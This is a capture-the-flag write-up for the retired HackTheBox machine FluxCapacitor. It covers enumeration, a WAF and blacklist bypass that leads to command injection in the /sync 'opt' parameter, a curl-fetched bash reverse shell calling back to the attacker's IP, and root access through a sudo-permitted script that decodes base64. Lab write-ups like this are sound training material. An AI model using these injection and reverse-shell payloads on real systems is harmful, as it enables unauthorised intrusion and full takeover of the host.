# FluxCapacitor

This is the write-up for the box FluxCapacitor that got retired at the 12th May 2018.
My IP address was 10.10.14.13 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.69    fluxcapacitor.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/fluxcapacitor.nmap 10.10.10.69
```

```markdown
PORT   STATE SERVICE VERSION
80/tcp open  http    SuperWAF
```

## Checking HTTP (Port 80)

On the web page we get the following text:
```markdown
OK: node1 alive FluxCapacitor Inc. info@fluxcapacitor.htb - http://fluxcapacitor.htb
Roads? Where we're going, we don't need roads.
```

In the HTML source is a comment about a _/sync_ directory:
```html
<!--
		Please, add timestamp with something like:
		<script> $.ajax({ type: "GET", url: '/sync' }); </script>
	-->
```

This directory responds with the HTTP code _403 Forbidden_ and displays **openresty/1.13.6.1** as the server.
This software is an open-source web platform that integrates **Nginx** with a **Just-In-Time-Compiler** for the **Lua** programming language.

Lets search for hidden directories with **Gobuster**:
```markdown
gobuster -u http://10.10.10.69/ dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds the following directories:
- /sync
- /synctoy
- /synching
- /sync_scan
- /syncbackse
- /synch
- /sync4j
- /synchpst
- /syncapture
- /syncback
- /syncml

The HTTP code responds back with _200 OK_ but when browsing there with a browser the pages respond with the HTTP code _403 Forbidden_.
One difference between **Gobuster** and the browser is the _User-Agent_, so lets send this to **Burpsuite** and change that header.
```markdown
GET /sync HTTP/1.1
Host: 10.10.10.69
User-Agent: Test
(...)
```

This works and it displays the current server date.
As the comment in the HTML code said we allegedly can add a timestamp on the _/sync_ directory. To do this we will use fuzzing with **Wfuzz**.

### Fuzzing the web application

We need to fuzz for a parameter that can display another date. When getting a valid parameter to change the displayed date on the server we can go further and may execute commands.
```markdown
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.10.10.69/sync?FUZZ=yesterday
```

Unfortunately every parameter responds with _200 OK_ and it shows always 19 characters. Lets filter out everything that has 19 characters:
```markdown
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.10.10.69/sync?FUZZ=yesterday --hh=19
```

It shows one result that has 175 characters and the _403 Forbidden_ response:
```markdown
===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000753:   403        7 L      10 W     175 Ch      "opt"
```

The parameter _/opt_ does something different than any other parameter when requesting for _yesterday_.
Now lets fuzz for the value of this parameter to see if using special characters are fine with it:
```markdown
wfuzz -c -w /usr/share/seclists/Fuzzing/special-chars.txt -u http://10.10.10.69/sync?opt=FUZZ
```

Results:
```markdown
===================================================================
ID           Response   Lines    Word     Chars    Payload
===================================================================

000000001:   200        2 L      1 W      19 Ch       "~"
000000003:   200        2 L      1 W      19 Ch       "@"
000000002:   200        2 L      1 W      19 Ch       "!"
000000004:   200        2 L      1 W      19 Ch       "#"
000000005:   403        7 L      10 W     175 Ch      "$"
000000009:   403        7 L      10 W     175 Ch      "\*"
000000006:   200        2 L      1 W      19 Ch       "%"
000000008:   200        2 L      1 W      19 Ch       "&"
000000010:   403        7 L      10 W     175 Ch      "("
000000007:   200        2 L      1 W      19 Ch       "^"
000000011:   403        7 L      10 W     175 Ch      ")"
000000012:   200        2 L      1 W      19 Ch       "\_"
000000013:   200        2 L      1 W      19 Ch       "\_"
000000014:   200        2 L      1 W      19 Ch       "+"
000000015:   200        2 L      1 W      19 Ch       "="
000000017:   200        2 L      1 W      19 Ch       "}"
000000020:   403        7 L      10 W     175 Ch      "|"
000000016:   200        2 L      1 W      19 Ch       "{"
000000018:   200        2 L      1 W      19 Ch       "]"
000000019:   200        2 L      1 W      19 Ch       "\["
000000021:   200        2 L      1 W      19 Ch       "\"
000000022:   403        7 L      10 W     175 Ch      "\`"
000000023:   200        2 L      1 W      19 Ch       ","
000000024:   200        2 L      1 W      19 Ch       "."
000000026:   200        2 L      1 W      19 Ch       "?"
000000027:   403        7 L      10 W     175 Ch      ";"
000000025:   200        2 L      1 W      19 Ch       "/"
000000028:   200        2 L      1 W      19 Ch       ":"
000000029:   200        1 L      0 W      1 Ch        "'"
000000030:   200        2 L      1 W      19 Ch       """
000000031:   403        7 L      10 W     175 Ch      "<"
000000032:   403        7 L      10 W     175 Ch      ">"
```

The special characters that result in a _403 Forbidden_ are:
> dollar sign, asterisk, normal brackets, pipe symbol, backtick, semicolon, greater/smaller than symbol

An odd result is that the _single quote symbol_ resulted in a different character size than the other symbols.

By starting the command with this symbol and try to execute commands after, it shows the output of the command.
It is important to have a space between the first _single quote_ and the command or else it does not work:
```markdown
GET /sync?opt=' whoami' HTTP/1.1
```

This shows the user _nobody_ and thus command execution works.

### Starting a reverse shell

Because of many blacklisted special characters, starting a reverse shell won't be possible so instead we can upload a file that consists the code for a reverse shell and execute it.
Checking the directory _/tmp_:
```markdown
GET /sync?opt=' l\s -l\a /tmp'
```

Some words seem to be blacklisted also, but this can be bypassed by escaping the characters with _backslashes_.
Everyone can write to the directory _/tmp_ so we can upload a file _(revshell.sh)_ with the reverse shell code:
```bash
bash -i >& /dev/tcp/10.10.14.13/9001 0>&1
```

Download the script:
```markdown
GET /sync?opt='  c\u\r\l 10.10.14.13/revshell.sh -o /tmp/abc'
```

This does not download it because of the _slash_ in _"/revshell.sh"_ but when renaming this file to _index.html_ in a directory where is nothing besides this, it gets treated as an index file and can be left out of the command:
```markdown
GET /sync?opt='  c\u\r\l 10.10.14.13 -o /tmp/abc'
```

Now we can make sure it got downloaded correctly by viewing it:
```markdown
GET /sync?opt=' c\a\t /tmp/abc'
```

Execute the script:
```markdown
GET /sync?opt=' b\a\s\h /tmp/abc'
```

After sending this request, the listener on my IP and port 9001 starts a reverse shell as the user _nobody_.

## Privilege Escalation

Lets examine the _sudo_ privileges of _nobody_:
```markdown
sudo -l

# Output
User nobody may run the following commands on fluxcapacitor:
    (ALL) ALL
    (root) NOPASSWD: /home/themiddle/.monit
```

The file _/home/themiddle/.monit_ is owned by root and _nobody_ can execute it as root. This file is a bash script with the following content:
```bash
#!/bin/bash

if [ "$1" == "cmd" ]; then
        echo "Trying to execute ${2}"
        CMD=$(echo -n ${2} | base64 -d)
        bash -c "$CMD"
fi
```

It has to be executed with two parameters. The first one is _cmd_ and the second parameter is a Base64-decoded command.
Lets Base64-decode _"bash"_:
```markdown
echo -n bash | base64

# Output
YmFzaA==
```

Now executing the script with `sudo` and the two parameters:
```markdown
sudo /home/themiddle/.monit cmd YmFzaA==
```

After executing this, it start a shell as root!
